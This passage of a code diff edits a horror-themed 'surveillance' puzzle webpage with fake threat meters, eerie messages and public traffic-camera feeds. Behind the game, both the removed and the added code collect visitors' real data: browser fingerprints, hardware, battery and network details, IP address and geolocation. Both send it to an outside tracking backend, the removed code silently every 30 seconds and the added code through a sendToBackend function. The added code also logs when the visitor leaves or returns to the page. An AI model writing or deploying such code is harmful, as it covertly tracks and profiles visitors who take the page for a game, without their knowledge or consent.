                 if (gl) {
-                    collectedData.webgl = {
+                    userData.webgl = {
                         vendor: gl.getParameter(gl.VENDOR),
-                        renderer: gl.getParameter(gl.RENDERER),
-                        version: gl.getParameter(gl.VERSION),
-                        shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
+                        renderer: gl.getParameter(gl.RENDERER)
                     };
                 }
             } catch (e) {}
 
-            // Get fonts (silent)
-            collectedData.fonts = detectFonts();
+            // Display system info
+            document.getElementById('systemDetails').innerHTML = `
+                <b>Browser:</b> ${userData.userAgent.substring(0, 50)}...<br>
+                <b>Platform:</b> ${userData.platform}<br>
+                <b>Cores:</b> ${userData.hardwareConcurrency}<br>
+                <b>Memory:</b> ${userData.deviceMemory}GB<br>
+                <b>Screen:</b> ${userData.screen.width}x${userData.screen.height}<br>
+                <b>Timezone:</b> ${userData.timezone}
+            `;
 
-            // Get plugins
-            const plugins = [];
-            for (let i = 0; i < navigator.plugins.length; i++) {
-                plugins.push(navigator.plugins[i].name);
-            }
-            collectedData.plugins = plugins;
-
-            // Get IP and location (multiple sources for accuracy)
-            await getIPAndLocation();
-
-            // Update display
-            updateSystemInfo();
+            await sendToBackend('system', userData);
         }
 
-        // Font detection
-        function detectFonts() {
-            const fonts = [
-                'Arial', 'Verdana', 'Helvetica', 'Tahoma', 'Trebuchet MS',
-                'Times New Roman', 'Georgia', 'Garamond', 'Courier New',
-                'Brush Script MT', 'Comic Sans MS', 'Impact', 'Lucida Console'
-            ];
-            const detected = [];
-            const baseFonts = ['monospace', 'sans-serif', 'serif'];
+        async function deepScan() {
+            terminalLog('🔬 Performing deep system scan...');
             
-            fonts.forEach(font => {
-                if (document.fonts?.check(`12px "${font}"`)) {
-                    detected.push(font);
-                }
+            // Get battery info
+            if ('getBattery' in navigator) {
+                const battery = await navigator.getBattery();
+                userData.battery = {
+                    level: battery.level * 100,
+                    charging: battery.charging
+                };
+            }
+
+            // Get connection info
+            if ('connection' in navigator) {
+                const conn = navigator.connection;
+                userData.network = {
+                    type: conn.effectiveType,
+                    rtt: conn.rtt,
+                    downlink: conn.downlink,
+                    saveData: conn.saveData
+                };
+            }
+
+            document.getElementById('systemDetails').innerHTML += `
+                <br><b>Battery:</b> ${userData.battery?.level || '?'}%<br>
+                <b>Network:</b> ${userData.network?.type || '?'}<br>
+                <b>RTT:</b> ${userData.network?.rtt || '?'}ms
+            `;
+
+            updateThreatLevel(15);
+            await sendToBackend('deep_scan', userData);
+        }
+
+        // ==================== NETWORK INFO ====================
+        async function getNetworkInfo() {
+            const networkInfo = {
+                ip: await getIP(),
+                connection: navigator.connection || {},
+                online: navigator.onLine
+            };
+
+            document.getElementById('networkDetails').innerHTML = `
+                <b>IP:</b> ${networkInfo.ip || 'Unknown'}<br>
+                <b>Status:</b> ${networkInfo.online ? '🟢 Online' : '🔴 Offline'}<br>
+                <b>Connection:</b> ${networkInfo.connection.effectiveType || 'Unknown'}<br>
+                <b>RTT:</b> ${networkInfo.connection.rtt || '?'}ms<br>
+                <b>Downlink:</b> ${networkInfo.connection.downlink || '?'} Mbps
+            `;
+        }
+
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch {
+                return 'Unknown';
+            }
+        }
+
+        // ==================== SATELLITE IMAGERY ====================
+        function initMap() {
+            map = L.map('satelliteMap').setView([0, 0], 2);
+            
+            // Regular streets layer
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                attribution: '© OpenStreetMap'
+            }).addTo(map);
+            
+            // Satellite layer (using ESRI satellite)
+            satelliteLayer = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
+                attribution: '© Esri'
             });
             
-            return detected;
+            // Try to get location immediately
+            setTimeout(getExactLocation, 1000);
         }
 
-        // Get IP and location from multiple sources
-        async function getIPAndLocation() {
+        function toggleSatelliteLayer() {
+            if (map.hasLayer(satelliteLayer)) {
+                map.removeLayer(satelliteLayer);
+            } else {
+                map.addLayer(satelliteLayer);
+            }
+        }
+
+        function refreshSatellite() {
+            if (currentLocation) {
+                // Refresh by recentering
+                map.setView([currentLocation.lat, currentLocation.lon], map.getZoom());
+                terminalLog('🛰️ Satellite view refreshed');
+                
+                // Add a marker at current location
+                L.marker([currentLocation.lat, currentLocation.lon]).addTo(map)
+                    .bindPopup('Your location')
+                    .openPopup();
+            }
+        }
+
+        function centerOnLocation() {
+            if (currentLocation) {
+                map.setView([currentLocation.lat, currentLocation.lon], 18);
+                refreshSatellite();
+            }
+        }
+
+        // ==================== CAMERA NETWORK ====================
+        async function fetchCameras() {
+            terminalLog('📡 Scanning for cameras...');
+            
             try {
-                // Multiple IP sources
-                const [ip1, ip2, geo1, geo2] = await Promise.allSettled([
-                    fetch('https://api.ipify.org?format=json').then(r => r.json()),
-                    fetch('https://api.ip.sb/geoip').then(r => r.json()),
-                    fetch('https://ipapi.co/json/').then(r => r.json()),
-                    fetch('http://ip-api.com/json/').then(r => r.json())
-                ]);
+                // Using OpenStreetMap cameras and public traffic cams
+                const cameras = [
+                    {
+                        name: "Helsinki Traffic Cam",
+                        url: "https://weathercam.digitraffic.fi/C0151301.jpg",
+                        country: "Finland",
+                        lat: 60.233,
+                        lon: 24.866
+                    },
+                    {
+                        name: "London Traffic Cam",
+                        url: "https://www.tfl.gov.uk/tfl/livetravelnews/trafficcameras/beckton.gif",
+                        country: "UK",
+                        lat: 51.507,
+                        lon: -0.127
+                    },
+                    {
+                        name: "New York Traffic Cam",
+                        url: "https://webcams.nyctmc.org/google_popup.php?cid=100",
+                        country: "USA",
+                        lat: 40.712,
+                        lon: -74.006
+                    },
+                    {
+                        name: "Tokyo Highway Cam",
+                        url: "https://www.shutoko.jp/use/camera/camera-image/01.jpg",
+                        country: "Japan",
+                        lat: 35.676,
+                        lon: 139.650
+                    },
+                    {
+                        name: "Sydney Traffic Cam",
+                        url: "https://www.livetraffic.com/camera/029-001.jpg",
+                        country: "Australia",
+                        lat: -33.868,
+                        lon: 151.209
+                    }
+                ];
 
-                if (ip1.status === 'fulfilled') {
-                    collectedData.ip = ip1.value.ip;
-                }
+                const cameraGrid = document.getElementById('cameraGrid');
+                cameraGrid.innerHTML = '';
 
-                // Combine geo data
-                const geoData = geo2.status === 'fulfilled' ? geo2.value : 
-                               geo1.status === 'fulfilled' ? geo1.value : {};
+                cameras.forEach(cam => {
+                    const distance = currentLocation ? 
+                        calculateDistance(currentLocation.lat, currentLocation.lon, cam.lat, cam.lon).toFixed(1) : 
+                        '?';
 
-                if (geoData) {
-                    collectedData.city = geoData.city;
-                    collectedData.region = geoData.regionName || geoData.region;
-                    collectedData.country = geoData.country;
-                    collectedData.postal = geoData.zip || geoData.postal;
-                    collectedData.location = {
-                        lat: geoData.lat || geoData.latitude,
-                        lon: geoData.lon || geoData.longitude,
-                        accuracy: geoData.accuracy
-                    };
+                    cameraGrid.innerHTML += `
+                        <div class="camera-feed">
+                            <h4>${cam.name}</h4>
+                            <img src="${cam.url}" onerror="this.src='https://via.placeholder.com/300x200?text=Camera+Offline'">
+                            <div class="data-panel">
+                                Country: ${cam.country}<br>
+                                Distance: ${distance}km<br>
+                                <button class="btn" onclick="viewOnMap(${cam.lat}, ${cam.lon})">📍 View on Map</button>
+                            </div>
+                        </div>
+                    `;
+                });
 
-                    // Update display
-                    document.getElementById('latitude').textContent = collectedData.location.lat?.toFixed(6) || '--.----';
-                    document.getElementById('longitude').textContent = collectedData.location.lon?.toFixed(6) || '--.----';
-                    
-                    let address = '';
-                    if (collectedData.city) address += `${collectedData.city}, `;
-                    if (collectedData.region) address += `${collectedData.region}, `;
-                    if (collectedData.country) address += collectedData.country;
-                    if (collectedData.postal) address += ` (${collectedData.postal})`;
-                    
-                    document.getElementById('address').textContent = address || 'Location acquired';
-                    
-                    // Get nearby places (simulated)
-                    getNearbyPlaces(collectedData.location.lat, collectedData.location.lon);
-                }
-            } catch (e) {
-                console.log('Location error:', e);
+                terminalLog(`📡 Found ${cameras.length} cameras`);
+                await sendToBackend('cameras', { count: cameras.length });
+                
+            } catch (error) {
+                terminalLog(`❌ Camera scan failed: ${error.message}`);
             }
-        }
-
-        // Simulate nearby places
-        function getNearbyPlaces(lat, lon) {
-            const places = [
-                '🔴 Surveillance Camera', '🏢 Government Building', '📡 Cell Tower',
-                '🏦 Bank', '🏪 24h Store', '🚦 Traffic Camera', '🚇 Subway Station',
-                '🏥 Hospital', '🏫 School', '🛒 Shopping Center'
-            ];
-            
-            const nearby = [];
-            for (let i = 0; i < 5; i++) {
-                const place = places[Math.floor(Math.random() * places.length)];
-                const distance = (Math.random() * 500).toFixed(1);
-                nearby.push(`${place} - ${distance}m`);
-            }
-            
-            document.getElementById('nearbyPlaces').innerHTML = nearby.join('<br>');
-        }
-
-        // ==================== SURVEILLANCE CAMERA NETWORK ====================
-        const CAMERA_NETWORK = [
-            { name: "HELSINKI - KEHA I", lat: 60.233, lon: 24.866, url: "https://weathercam.digitraffic.fi/C0151301.jpg", country: "Finland" },
-            { name: "HELSINKI - TIE 101", lat: 60.233, lon: 24.933, url: "https://weathercam.digitraffic.fi/C0150402.jpg", country: "Finland" },
-            { name: "PORVOO - CITY CENTER", lat: 60.392, lon: 25.670, url: "https://weathercam.digitraffic.fi/C0150200.jpg", country: "Finland" },
-            { name: "TAMPERE - HIGHWAY 3", lat: 61.498, lon: 23.761, url: "https://weathercam.digitraffic.fi/C0161201.jpg", country: "Finland" },
-            { name: "TURKU - PORT", lat: 60.451, lon: 22.267, url: "https://weathercam.digitraffic.fi/C0120201.jpg", country: "Finland" },
-            { name: "OULU - CENTER", lat: 65.012, lon: 25.468, url: "https://weathercam.digitraffic.fi/C0201201.jpg", country: "Finland" },
-            { name: "GLASGOW - CITY CENTRE", lat: 55.864, lon: -4.251, url: "https://www.glasgow.gov.uk/cctv/image1.jpg", country: "UK" },
-            { name: "WISCONSIN - I-94", lat: 44.842, lon: -91.603, url: "https://511wi.gov/cctv/CCTV-18-0012/image.jpg", country: "USA" },
-            { name: "MINNESOTA - I-35", lat: 44.978, lon: -93.272, url: "https://www.dot.state.mn.us/tmc/cctv/358.jpg", country: "USA" },
-            { name: "DC - TRAFFIC CAM", lat: 38.895, lon: -77.036, url: "https://ddot.dc.gov/camera/1/image.jpg", country: "USA" }
-        ];
-
-        function scanForCameras() {
-            if (!collectedData.location?.lat || !collectedData.location?.lon) return;
-            
-            const nearby = CAMERA_NETWORK.map(cam => {
-                const distance = calculateDistance(
-                    collectedData.location.lat, 
-                    collectedData.location.lon, 
-                    cam.lat, cam.lon
-                );
-                return { ...cam, distance };
-            })
-            .filter(cam => cam.distance < 1000)
-            .sort((a, b) => a.distance - b.distance);
-
-            displayCameras(nearby);
-            
-            // Update threat level
-            threatLevel = Math.min(100, nearby.length * 15);
-            updateThreatLevel();
         }
 
         function calculateDistance(lat1, lon1, lat2, lon2) {
@@ -883,451 +645,144 @@
             return R * c;
         }
 
-        function displayCameras(cameras) {
-            const list = document.getElementById('cameraList');
-            if (cameras.length === 0) {
-                list.innerHTML = 'No cameras found in range';
-                return;
+        function viewOnMap(lat, lon) {
+            map.setView([lat, lon], 15);
+        }
+
+        // ==================== QUANTUM RANDOM NUMBERS ====================
+        async function generateRandom() {
+            terminalLog('🎲 Generating quantum random numbers...');
+            
+            try {
+                // Using random.org API (true random numbers)
+                const response = await fetch('https://www.random.org/integers/?num=5&min=1&max=100&col=1&base=10&format=plain&rnd=new');
+                const text = await response.text();
+                const numbers = text.trim().split('\n').map(n => parseInt(n));
+                
+                document.getElementById('randomNumbers').textContent = numbers.join(' - ');
+                document.getElementById('randomSource').innerHTML = `
+                    Source: random.org (atmospheric noise)<br>
+                    Generated: ${new Date().toLocaleTimeString()}
+                `;
+                
+                await sendToBackend('random', { numbers });
+                
+                // Check for special numbers
+                if (numbers.includes(42) || numbers.includes(23) || numbers.includes(66)) {
+                    updateThreatLevel(10);
+                }
+                
+            } catch (error) {
+                // Fallback to crypto random
+                const numbers = [];
+                for (let i = 0; i < 5; i++) {
+                    numbers.push(crypto.getRandomValues(new Uint32Array(1))[0] % 100 + 1);
+                }
+                document.getElementById('randomNumbers').textContent = numbers.join(' - ');
+                document.getElementById('randomSource').innerHTML = 'Source: Crypto API (fallback)';
             }
-
-            list.innerHTML = cameras.map(cam => 
-                `<div style="margin:5px 0; cursor:pointer;" onclick="showCameraFeed(${cameras.indexOf(cam)})">
-                    ${cam.name} - ${cam.distance.toFixed(2)}km
-                </div>`
-            ).join('');
-
-            showCameraFeed(0);
         }
 
-        function showCameraFeed(index) {
-            cameraIndex = index;
-            const cameras = CAMERA_NETWORK;
-            const cam = cameras[index];
-            const img = document.getElementById('activeCameraFeed');
-            img.src = cam.url + '?t=' + Date.now();
-            document.getElementById('cameraInfo').innerHTML = `${cam.name}<br>${cam.distance?.toFixed(2)}km`;
+        // ==================== ENCRYPTED MESSAGES ====================
+        async function fetchMessages() {
+            try {
+                const response = await fetch(`${BACKEND_URL}/api/messages`);
+                const data = await response.json();
+                
+                document.getElementById('messages').innerHTML = data.messages.map(msg => `
+                    <div style="border-bottom: 1px solid #0f0; padding: 5px;">
+                        <b>FROM:</b> ${msg.sender}<br>
+                        <b>SUBJ:</b> ${msg.subject}<br>
+                        <small>${msg.time}</small>
+                    </div>
+                `).join('');
+                
+            } catch (error) {
+                // Fallback messages
+                const messages = [
+                    { sender: 'SYSTEM', subject: 'Location ping received', time: new Date().toLocaleTimeString() },
+                    { sender: 'UNKNOWN', subject: 'They are watching', time: new Date().toLocaleTimeString() },
+                    { sender: 'DARKWEB', subject: 'Your data is for sale', time: new Date().toLocaleTimeString() }
+                ];
+                
+                document.getElementById('messages').innerHTML = messages.map(msg => `
+                    <div style="border-bottom: 1px solid #0f0; padding: 5px;">
+                        <b>FROM:</b> ${msg.sender}<br>
+                        <b>SUBJ:</b> ${msg.subject}<br>
+                        <small>${msg.time}</small>
+                    </div>
+                `).join('');
+            }
         }
 
-        // ==================== SYSTEM INFO DISPLAY ====================
-        function updateSystemInfo() {
-            const sysInfo = document.getElementById('sysInfo');
-            sysInfo.innerHTML = `
-IP: ${collectedData.ip || 'acquiring...'}<br>
-Browser: ${collectedData.userAgent?.substring(0, 40)}...<br>
-OS: ${getOS()}<br>
-Screen: ${collectedData.screen?.width}x${collectedData.screen?.height}<br>
-Cores: ${collectedData.hardwareConcurrency}<br>
-Memory: ${collectedData.deviceMemory || '?'}GB<br>
-Timezone: ${collectedData.timezone?.zone}<br>
-Language: ${collectedData.language}<br>
-Touch Points: ${collectedData.maxTouchPoints}<br>
-Canvas: ${collectedData.canvas ? '✓' : '✗'}<br>
-WebGL: ${collectedData.webgl ? '✓' : '✗'}<br>
-Fonts: ${collectedData.fonts?.length || 0} detected<br>
-Plugins: ${collectedData.plugins?.length || 0}
-            `;
-        }
-
-        function getOS() {
-            const ua = navigator.userAgent;
-            if (ua.includes('Windows')) return 'Windows';
-            if (ua.includes('Mac')) return 'macOS';
-            if (ua.includes('Linux')) return 'Linux';
-            if (ua.includes('Android')) return 'Android';
-            if (ua.includes('iOS')) return 'iOS';
-            return 'Unknown';
+        // ==================== BACKEND COMMUNICATION ====================
+        async function sendToBackend(type, data) {
+            try {
+                const response = await fetch(`${BACKEND_URL}/api/track`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        type: type,
+                        data: data,
+                        timestamp: new Date().toISOString(),
+                        userAgent: navigator.userAgent
+                    })
+                });
+                
+                const result = await response.json();
+                terminalLog(`📡 Sent to backend: ${type}`);
+                
+            } catch (error) {
+                console.error('Backend error:', error);
+            }
         }
 
         // ==================== THREAT SYSTEM ====================
-        function updateThreatLevel() {
-            document.getElementById('threatLevel').textContent = threatLevel;
+        function updateThreatLevel(increase) {
+            threatLevel = Math.min(100, threatLevel + increase);
+            document.getElementById('threatLevel').style.width = threatLevel + '%';
             
-            if (threatLevel < 30) {
-                document.getElementById('threatMessage').textContent = 'LOW - SCANNING';
-            } else if (threatLevel < 60) {
-                document.getElementById('threatMessage').textContent = 'MEDIUM - WATCHING';
-            } else if (threatLevel < 90) {
-                document.getElementById('threatMessage').textContent = 'HIGH - TRACKING';
-            } else {
-                document.getElementById('threatMessage').textContent = 'CRITICAL - DETECTED';
-            }
-
-            // Update timeline progress
-            document.getElementById('timelineProgress').style.width = threatLevel + '%';
-        }
-
-        // ==================== PUZZLE PIECES ====================
-        function addPuzzlePiece() {
-            if (puzzlePieces < 9) {
-                puzzlePieces++;
-                document.getElementById('fragmentsFound').textContent = `${puzzlePieces}/9 fragments collected`;
-                
-                const container = document.getElementById('puzzlePieces');
-                const piece = document.createElement('div');
-                piece.className = 'puzzle-piece found';
-                container.appendChild(piece);
-
-                // Check for completion
-                if (puzzlePieces === 9) {
-                    setTimeout(() => {
-                        alert('⚠️ REALITY FRAGMENTS ASSEMBLED ⚠️\nCoordinates: 60.233, 24.866');
-                        threatLevel = 100;
-                        updateThreatLevel();
-                    }, 500);
-                }
+            if (threatLevel > 75) {
+                document.body.style.animation = 'glitch 0.5s infinite';
             }
         }
 
-        // ==================== MATRIX RAIN ====================
-        function initMatrixRain() {
-            const canvas = document.getElementById('matrixCanvas');
-            const ctx = canvas.getContext('2d');
-            
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-
-            const chars = '01010101010101010101アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
-            const columns = canvas.width / 20;
-            const drops = [];
-
-            for (let i = 0; i < columns; i++) {
-                drops[i] = 1;
-            }
-
-            function draw() {
-                ctx.fillStyle = 'rgba(0, 0, 0, 0.04)';
-                ctx.fillRect(0, 0, canvas.width, canvas.height);
-
-                ctx.fillStyle = '#0f0';
-                ctx.font = '15px monospace';
-
-                for (let i = 0; i < drops.length; i++) {
-                    const text = chars[Math.floor(Math.random() * chars.length)];
-                    ctx.fillText(text, i * 20, drops[i] * 20);
-
-                    if (drops[i] * 20 > canvas.height && Math.random() > 0.975) {
-                        drops[i] = 0;
-                    }
-                    drops[i]++;
-                }
-            }
-
-            setInterval(draw, 35);
-        }
-
-        // ==================== DATA STREAM ====================
-        function startDataStream() {
+        // ==================== TERMINAL ====================
+        function startTerminal() {
             setInterval(() => {
-                const stream = document.getElementById('dataStream');
-                const hex = Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0');
-                const data = `[${new Date().toISOString()}] [${hex}] TRANSMITTING: ${Math.random().toString(36).substring(7)}...\n`;
-                stream.innerHTML = data + stream.innerHTML;
-                if (stream.innerHTML.length > 1000) {
-                    stream.innerHTML = stream.innerHTML.substring(0, 1000);
+                const output = document.getElementById('terminalOutput');
+                const lines = output.innerHTML.split('<br>');
+                if (lines.length > 20) {
+                    lines.pop();
+                    output.innerHTML = lines.join('<br>');
                 }
-            }, 100);
-        }
-
-        // ==================== EVENT LISTENERS ====================
-        document.addEventListener('DOMContentLoaded', () => {
-            collectAllData();
-            initMatrixRain();
-            startDataStream();
-            
-            // Auto scan for cameras after location
-            setTimeout(() => {
-                if (collectedData.location) {
-                    scanForCameras();
-                }
-            }, 2000);
-
-            // Update time
-            setInterval(() => {
-                document.getElementById('systemTime').textContent = `> TIME: ${new Date().toLocaleString()}`;
-            }, 1000);
-
-            // Random online users
-            setInterval(() => {
-                document.getElementById('onlineUsers').textContent = Math.floor(Math.random() * 9000 + 1000);
             }, 5000);
-        });
+        }
 
-        // Force location button
-        document.getElementById('forceLocation').addEventListener('click', () => {
-            document.getElementById('address').innerHTML = 'FORCING GEOLOCATION...';
-            getIPAndLocation();
-            addPuzzlePiece();
-        });
+        function terminalLog(message) {
+            const output = document.getElementById('terminalOutput');
+            const time = new Date().toLocaleTimeString();
+            output.innerHTML = `<div class="terminal-line">[${time}] ${message}</div>` + output.innerHTML;
+        }
 
-        // Scan cameras button
-        document.getElementById('scanCameras').addEventListener('click', () => {
-            scanForCameras();
-            addPuzzlePiece();
-        });
-
-        // Next camera button
-        document.getElementById('nextCamera').addEventListener('click', () => {
-            cameraIndex = (cameraIndex + 1) % CAMERA_NETWORK.length;
-            showCameraFeed(cameraIndex);
-        });
-
-        // Deep scan button
-        document.getElementById('deepScan').addEventListener('click', () => {
-            const hardwareDiv = document.getElementById('hardwareInfo');
-            hardwareDiv.style.display = 'block';
-            hardwareDiv.innerHTML = `
-GPU: ${collectedData.webgl?.renderer || 'Unknown'}<br>
-GPU Vendor: ${collectedData.webgl?.vendor || 'Unknown'}<br>
-Canvas FP: ${collectedData.canvas?.substring(0, 30)}...<br>
-Fonts: ${collectedData.fonts?.join(', ')}<br>
-Plugins: ${collectedData.plugins?.join(', ')}<br>
-Battery: ${collectedData.battery?.level || '?'}%<br>
-Network: ${collectedData.network?.type || '?'}<br>
-RTT: ${collectedData.network?.rtt || '?'}ms
-            `;
-            addPuzzlePiece();
-        });
-
-        // Forbidden button
-        let buttonMessages = [
-            "Why did you do that?",
-            "They're watching now.",
-            "The button is bleeding.",
-            "Check the cameras.",
-            "Only 5 presses left...",
-            "You shouldn't have done that.",
-            "They know your name.",
-            "It's too late now.",
-            "The screen is glitching.",
-            "Behind you."
-        ];
-
-        document.getElementById('forbiddenButton').addEventListener('click', () => {
-            buttonPresses++;
-            const history = document.getElementById('pressHistory');
-            const messages = document.getElementById('buttonMessages');
-            
-            history.innerHTML = `Presses: ${buttonPresses}<br>` + history.innerHTML;
-            
-            if (buttonPresses <= buttonMessages.length) {
-                messages.innerHTML = buttonMessages[buttonPresses - 1];
-            }
-
-            // Increase threat
-            threatLevel = Math.min(100, threatLevel + 5);
-            updateThreatLevel();
-
-            // Puzzle piece at certain numbers
-            if ([3, 6, 9].includes(buttonPresses)) {
-                addPuzzlePiece();
-            }
-
-            // Special message at 9 presses
-            if (buttonPresses === 9) {
-                messages.innerHTML = "⚠️ COORDINATES REVEALED: 60.233, 24.866 ⚠️";
-                threatLevel = 100;
-                updateThreatLevel();
-            }
-        });
-
-        // Audio frequency
-        document.getElementById('playFrequency').addEventListener('click', () => {
-            const freq = document.getElementById('frequencySlider').value;
-            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-            const osc = audioCtx.createOscillator();
-            const gain = audioCtx.createGain();
-            
-            osc.type = 'sine';
-            osc.frequency.value = freq;
-            gain.gain.value = 0.1;
-            
-            osc.connect(gain);
-            gain.connect(audioCtx.destination);
-            osc.start();
-            osc.stop(audioCtx.currentTime + 0.5);
-
-            document.getElementById('audioMessage').innerHTML = `Transmitting at ${freq}Hz...`;
-            
-            // Visualize
-            const canvas = document.getElementById('audioVisualizer');
-            const ctx = canvas.getContext('2d');
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = '#0f0';
-            ctx.fillRect(0, 0, freq / 10, 100);
-        });
-
-        // Name ritual
-        document.getElementById('summonName').addEventListener('click', () => {
-            const name = document.getElementById('ritualName').value;
-            if (!name) return;
-
-            collectedNames.push(name);
-            
-            const result = document.getElementById('nameResult');
-            const history = document.getElementById('nameHistory');
-            
-            if (name.toLowerCase() === 'helsinki' || name === '60.233, 24.866') {
-                result.innerHTML = '⚠️ REALITY BREACH DETECTED ⚠️';
-                threatLevel = 100;
-                updateThreatLevel();
-                addPuzzlePiece();
-            } else {
-                result.innerHTML = `"${name}" added to database. ${Math.floor(Math.random() * 100)}% match found.`;
-            }
-            
-            history.innerHTML = collectedNames.map(n => `> ${n}`).join('<br>');
-        });
-
-        // Random generator
-        document.getElementById('generateRandom').addEventListener('click', () => {
-            const nums = [];
-            for (let i = 0; i < 5; i++) {
-                nums.push(Math.floor(Math.random() * 100));
-            }
-            document.getElementById('randomNumbers').textContent = nums.join(' - ');
-            
-            if (nums.includes(42) || nums.includes(23) || nums.includes(66)) {
-                document.getElementById('quantumMessage').innerHTML = '⚠️ SIGNAL DETECTED ⚠️';
-                addPuzzlePiece();
-            }
-        });
-
-        // Cipher decoder
-        document.getElementById('decodeCipher').addEventListener('click', () => {
-            const input = document.getElementById('cipherInput').value;
-            const output = document.getElementById('cipherOutput');
-            
-            // Simple ROT13
-            const decoded = input.replace(/[a-zA-Z]/g, c => 
-                String.fromCharCode(c <= 'Z' ? 90 : 122 >= c ? 
-                c.charCodeAt(0) + 13 : c.charCodeAt(0) - 13));
-            
-            output.innerHTML = decoded;
-            
-            if (decoded.toLowerCase().includes('helsinki') || decoded.toLowerCase().includes('midnight')) {
-                addPuzzlePiece();
-            }
-        });
-
-        // Timeline scan
-        document.getElementById('scanTimeline').addEventListener('click', () => {
-            const events = [
-                "2023-12-21: Your IP logged",
-                "2024-01-15: Camera detected",
-                "2024-02-03: Location ping",
-                "2024-02-28: System fingerprint stored",
-                "2024-03-15: Pattern recognized",
-                new Date().toISOString().split('T')[0] + ": You are here"
-            ];
-            
-            document.getElementById('timelineEvents').innerHTML = events.join('<br>');
-            addPuzzlePiece();
-        });
-
-        // Dark web scrape
-        document.getElementById('scrapeDarkWeb').addEventListener('click', () => {
-            const data = [
-                "> Selling user data: $0.01",
-                "> Your location available",
-                "> Camera feeds online",
-                "> 237 profiles match you",
-                "> Auction in progress"
-            ];
-            
-            document.getElementById('darkWebData').innerHTML = data.join('<br>');
-            threatLevel += 10;
-            updateThreatLevel();
-        });
-
-        // Conspiracy generator
-        document.getElementById('generateTheory').addEventListener('click', () => {
-            const theories = [
-                "The cameras are watching you through your screen",
-                "Your microphone is always listening",
-                "They know where you live",
-                "The button knows your name",
-                "Midnight is when they come",
-                "You are being tracked across all devices",
-                "The website knows what you're thinking",
-                "Your location has been sold 237 times"
-            ];
-            
-            document.getElementById('conspiracyText').innerHTML = theories[Math.floor(Math.random() * theories.length)];
-        });
-
-        // Satellite refresh
-        document.getElementById('refreshSatellite').addEventListener('click', () => {
-            if (collectedData.location?.lat && collectedData.location?.lon) {
-                document.getElementById('satelliteImage').src = `https://api.mapbox.com/v4/mapbox.satellite/${collectedData.location.lon},${collectedData.location.lat},15/400x300.jpg?access_token=pk.eyJ1IjoiZXhhbXBsZSIsImEiOiJja2V4YW1wbGV0b2tlbiJ9.example`;
-            }
-        });
-
-        // New message
-        document.getElementById('newMessage').addEventListener('click', () => {
-            const messages = [
-                "FROM: UNKNOWN\nSUBJ: They're watching",
-                "FROM: SYSTEM\nSUBJ: Location ping received",
-                "FROM: DARKWEB\nSUBJ: Your data for sale",
-                "FROM: NSA\nSUBJ: Pattern detected",
-                "FROM: ??\nSUBJ: Midnight approaching"
-            ];
-            
-            document.getElementById('encryptedMessages').innerHTML = messages[Math.floor(Math.random() * messages.length)];
-        });
-
-        // Archive navigation
-        const archives = [
-            { video: 'archive1', label: 'CCTV Footage - Day 1' },
-            { video: 'archive2', label: 'CCTV Footage - Night 1' },
-            { video: 'archive3', label: 'CCTV Footage - Day 2' },
-            { video: 'archive4', label: 'CCTV Footage - Night 2' },
-            { video: 'archive5', label: 'CCTV Footage - Final' }
-        ];
-
-        document.getElementById('nextArchive').addEventListener('click', () => {
-            archiveIndex = (archiveIndex + 1) % archives.length;
-            document.getElementById('archiveLabel').innerHTML = archives[archiveIndex].label;
-            
-            if (archiveIndex === 4) {
-                document.getElementById('archiveLabel').innerHTML += ' ⚠️ COORDINATES FOUND: 60.233, 24.866';
-                addPuzzlePiece();
-            }
-        });
-
-        // Secret reveal function
-        window.revealSecret = (num) => {
-            const secrets = [
-                "The button knows...",
-                "Check at midnight...",
-                "60.233, 24.866",
-                "They're behind you",
-                "Your screen is glitching"
-            ];
-            alert(secrets[num - 1]);
-            addPuzzlePiece();
-        };
-
-        // Auto camera feed cycling
+        // ==================== AUTO TRIGGERS ====================
         setInterval(() => {
-            if (document.visibilityState === 'visible') {
-                cameraIndex = (cameraIndex + 1) % CAMERA_NETWORK.length;
-                showCameraFeed(cameraIndex);
+            if (currentLocation) {
+                refreshSatellite();
             }
-        }, 10000);
-
-        // Send data to backend silently
-        setInterval(() => {
-            fetch('https://b-n1nt.onrender.com/api/track', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    data: collectedData,
-                    timestamp: new Date().toISOString(),
-                    puzzlePieces: puzzlePieces,
-                    threatLevel: threatLevel
-                })
-            }).catch(() => {});
         }, 30000);
+
+        // Track page visibility
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden) {
+                terminalLog('👁️ User left page');
+            } else {
+                terminalLog('👁️ User returned');
+                getExactLocation();
+            }
+        });
     </script>
 </body>
 </html>
